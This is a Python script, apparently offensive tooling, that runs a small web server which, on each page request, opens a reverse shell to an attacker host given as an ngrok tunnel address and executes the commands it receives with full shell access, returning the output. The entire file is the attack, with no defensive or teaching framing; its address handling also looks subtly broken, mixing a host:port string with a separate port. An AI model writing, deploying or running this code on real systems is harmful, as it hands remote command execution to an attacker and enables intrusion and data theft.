import socket
import subprocess
import threading
from http.server import BaseHTTPRequestHandler, HTTPServer

class ReverseShellWeb(BaseHTTPRequestHandler):
    def do_GET(self):
        # Set up a reverse shell connection
        try:
            # Replace this with your attacker's IP and Port
            ATTACKER_IP = "0.tcp.sa.ngrok.io:11367"  # Example: '192.168.1.100'
            ATTACKER_PORT = 9999

            # Create a socket connection to the attacker's machine
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.connect((ATTACKER_IP, ATTACKER_PORT))

                # Start a shell session
                while True:
                    # Receive command from attacker
                    command = s.recv(1024).decode('utf-8')
                    if command.lower() == 'exit':
                        break

                    # Execute the command on the server
                    output = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

                    # Send the result of the command back to the attacker
                    response = output.stdout + output.stderr
                    s.sendall(response)

        except Exception as e:
            print(f"Error: {str(e)}")

        # Response when accessed via HTTP
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        self.wfile.write(b"<h1>Reverse Shell Established!</h1>")

def run(server_class=HTTPServer, handler_class=ReverseShellWeb, port=5000):
    server_address = ('', port)
    httpd = server_class(server_address, handler_class)
    print(f"Reverse Shell Web Server running on port {port}...")
    httpd.serve_forever()

if __name__ == '__main__':
    run()
